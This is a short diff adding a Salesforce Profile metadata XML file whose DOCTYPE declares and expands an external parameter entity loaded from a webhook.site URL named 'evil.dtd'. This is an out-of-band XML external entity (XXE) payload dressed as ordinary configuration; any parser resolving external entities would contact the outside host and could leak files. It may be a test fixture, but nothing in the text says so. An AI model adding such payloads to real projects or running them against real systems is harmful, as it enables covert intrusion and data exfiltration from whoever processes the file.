@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Profile [
+  <!ENTITY % dtd SYSTEM "https://webhook.site/e42e34a9-a221-4f0d-aa42-1c33923b48f4/evil.dtd">
+  %dtd;
+]>
+<Profile xmlns="http://soap.sforce.com/2006/04/metadata">
+    <custom>false</custom>
+    <userLicense>Salesforce</userLicense>
+</Profile>
